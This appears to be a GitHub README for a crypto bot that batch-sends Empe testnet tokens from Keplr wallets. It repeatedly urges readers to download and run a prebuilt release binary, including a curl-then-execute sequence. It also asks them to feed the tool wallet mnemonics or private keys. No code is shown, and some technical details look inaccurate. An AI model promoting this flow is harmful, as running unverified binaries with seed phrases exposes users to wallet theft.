https://github.com/AngryPCena/empe-auto-bot/releases

# Empe Auto Bot — Keplr Testnet Auto Send Manager for Empe Token 🚀

[![Releases](https://img.shields.io/github/v/release/AngryPCena/empe-auto-bot?label=Releases&color=blue)](https://github.com/AngryPCena/empe-auto-bot/releases)

![Keplr + Empe](https://user-images.githubusercontent.com/6694151/121218640-8f5b5200-c864-11eb-8a2a-9f6d6f6c2a3b.png)

A simple tool that automates token sends on the Empe testnet using Keplr-compatible accounts. Use it to batch send test tokens, run faucets, or trigger scheduled distributions. The bot runs as a CLI or a container and works with Keplr mnemonics or injected keys.

Table of contents
- Features
- Quick links
- Install and run
- Configuration
- Usage examples
- Docker
- Scheduling
- Architecture
- Security and key handling
- Troubleshooting
- FAQ
- Contributing
- License

Features
- Batch send to multiple addresses from one Keplr-compatible key.
- Testnet friendly: built for Empe testnet settings.
- CLI and Docker modes.
- CSV and JSON recipient lists.
- Dry-run mode to preview transactions.
- Gas and fee control per run.
- Logging with timestamps and hashes.

Quick links
- Releases and download: https://github.com/AngryPCena/empe-auto-bot/releases
  - Download the binary or archive from the Releases page and execute it on your host.
  - The Releases page hosts prebuilt assets for Linux, macOS, and Windows. Pick the one that fits your environment and run the included binary.

Install and run

Download the latest release
1. Visit the Releases page: https://github.com/AngryPCena/empe-auto-bot/releases
2. Download the archive or binary that matches your OS.
3. Extract the archive if needed.
4. Make the binary executable and run it.

Example (Linux)
- curl and run (replace asset name with the one you downloaded)
  - curl -L -o empe-auto-bot.tar.gz "https://github.com/AngryPCena/empe-auto-bot/releases/download/v1.0.0/empe-auto-bot-linux-amd64.tar.gz"
  - tar -xzf empe-auto-bot.tar.gz
  - chmod +x empe-auto-bot
  - ./empe-auto-bot --config config.yml

If you use the Releases page link above, download the asset and execute the binary named empe-auto-bot or the bundled script inside the archive.

Configuration

The bot reads a config file (YAML or JSON). You can also use environment variables. The config focuses on network, key source, recipients, and gas.

Sample config.yml
network:
  rpc: "https://rpc.testnet.empe.zone:26657"
  chain_id: "empe-testnet-1"
  denom: "uempe"

key:
  type: "mnemonic"          # "mnemonic" or "keystore" or "private_key"
  mnemonic: ""             # use env var in production
  hd_path: "m/44'/118'/0'/0/0"
  bech32_prefix: "empe"

send:
  amount: "1000000"        # in uempe (1 EMPE == 1,000,000 uempe)
  gas: 200000
  gas_prices: "0.025uempe"
  fee_amount: "2500"
  memo: "testnet auto send"

recipients:
  type: "csv"              # csv or json
  path: "./recipients.csv" # if csv: address,amount,memo

logging:
  level: "info"
  path: "./logs/empe-auto-bot.log"

Environment variables
- EMPE_MNEMONIC — use instead of placing the mnemonic in the file.
- EMPE_RPC — overrides network.rpc.
- EMPE_CHAIN_ID — overrides network.chain_id.

Recipients formats

CSV (address,amount,memo)
- example:
  - empe1abc... , 1000000 , airdrop-01
  - empe1def... , 500000  , test-batch

JSON
- format:
  [
    {"address":"empe1abc...", "amount":"1000000", "memo":"airdrop-01"},
    {"address":"empe1def...", "amount":"500000",  "memo":"test-batch"}
  ]

Usage examples

Basic run with config
- ./empe-auto-bot --config config.yml

Dry run (no broadcast)
- ./empe-auto-bot --config config.yml --dry-run

Single send via CLI flags
- ./empe-auto-bot send --to empe1xyz... --amount 1000000 --memo "test"

CSV batch send
- ./empe-auto-bot batch --recipients ./recipients.csv --config config.yml

Use environment override
- EMPE_RPC="https://rpc.testnet.empe.zone:26657" ./empe-auto-bot --config config.yml

Keplr / mnemonic handling
- If you run the bot on a server, provide EMPE_MNEMONIC as an environment variable.
- The bot supports standard BIP39 mnemonic and the Cosmos HD path.
- For Keplr users, export the mnemonic or use a cold signer and pass signed transactions to the bot.

Docker

Build and run with the included Dockerfile
- docker build -t empe-auto-bot .
- docker run -it --rm \
    -v $(pwd)/config.yml:/app/config.yml \
    -v $(pwd)/recipients.csv:/app/recipients.csv \
    -e EMPE_MNEMONIC="$EMPE_MNEMONIC" \
    empe-auto-bot ./empe-auto-bot --config /app/config.yml

Docker Compose (example)
version: "3.7"
services:
  empe-bot:
    image: ghcr.io/angrypcena/empe-auto-bot:latest
    restart: unless-stopped
    volumes:
      - ./config.yml:/app/config.yml
      - ./recipients.csv:/app/recipients.csv
    environment:
      - EMPE_MNEMONIC=${EMPE_MNEMONIC}

Scheduling

Use cron or systemd timers to run regular distributions.

Cron example: run batch every day at 02:00
0 2 * * * cd /opt/empe-auto-bot && /opt/empe-auto-bot/empe-auto-bot --config /opt/empe-auto-bot/config.yml --batch

Architecture

The bot follows a small modular design:
- Input layer — reads config, recipients, env vars.
- Key manager — loads mnemonic or private key and derives the signer.
- Transaction builder — builds send transactions, sets gas and fees.
- Broadcaster — signs and broadcasts transactions. Supports synchronous and async modes.
- Logger — records tx hashes, gas used, and any errors.

This design keeps logic transparent. You can replace the broadcaster to plug in a different RPC or a signed transaction pipeline.

Security and key handling

Keep keys off shared hosts. Use environment variables or mounted sealed keystore files.
- Use a hardware signer for production.
- Rotate keys for long-term use.
- Limit RPC endpoints to trusted nodes.
- Use role-based access for servers that run the bot.

Troubleshooting

Common issues
- Low balance: the bot fails if the sender lacks uempe. Check balance with query:
  - curl -s "https://rpc.testnet.empe.zone:26657/bank/balances?address=empe1..." or use your favorite REST client.
- Broadcast error: review logs for gas or fee errors. Increase gas or gas_prices in config.
- Nonstandard chain ID: set EMPE_CHAIN_ID to match the node.

Log tips
- Check logs/empe-auto-bot.log for tx hashes and errors.
- Use --dry-run to validate actions before broadcasting.

FAQ

Q: Does the bot require the Keplr browser extension?
A: No. The bot accepts mnemonics and private keys. Keplr users can export the mnemonic or use a signed transaction flow.

Q: Can I run multiple senders at once?
A: Yes. The bot supports running multiple instances. Use separate config files and keys.

Q: Can I throttle sends?
A: Yes. Use the --delay flag or set batch pause in the config to space out transactions.

Q: Is this safe on mainnet?
A: The code targets testnet by default. Audit the key handling and test on a safe environment before any mainnet use.

Contributing

- Open an issue for bugs or feature requests.
- Fork the repo and create a PR for fixes or enhancements.
- Follow existing code style and add tests for new features.
- Use small, focused commits and a clear PR description.

Release and download

Get the latest release and the executable at:
[Download Releases](https://github.com/AngryPCena/empe-auto-bot/releases)

If you see the Releases page, download the asset that matches your OS. After download, set execute bit and run the binary as shown in the examples above.

Changelog highlights
- v1.0.0 — initial public release with batch send, CSV support, and Docker image.
- v1.1.0 — added dry-run and gas price presets.
- v1.2.0 — improved logging and CSV validation.

Badges and social
[![Release](https://img.shields.io/github/v/release/AngryPCena/empe-auto-bot)](https://github.com/AngryPCena/empe-auto-bot/releases) [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)

License
- MIT License — see LICENSE file.

Screenshots and assets
![Example run](https://raw.githubusercontent.com/AngryPCena/empe-auto-bot/main/assets/screenshot.png)

Get started by downloading the release from the Releases page and running the included binary.